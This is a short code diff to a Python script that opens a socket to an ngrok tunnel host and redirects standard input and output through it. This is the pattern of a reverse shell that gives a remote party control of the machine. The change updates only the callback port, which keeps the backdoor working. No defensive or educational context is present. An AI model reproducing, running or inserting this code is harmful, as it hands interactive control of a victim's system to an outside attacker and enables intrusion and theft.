@@ -6,7 +6,7 @@ import os
 import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('0.tcp.ap.ngrok.io', 11819))
+s.connect(('0.tcp.ap.ngrok.io', 12667))
 
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
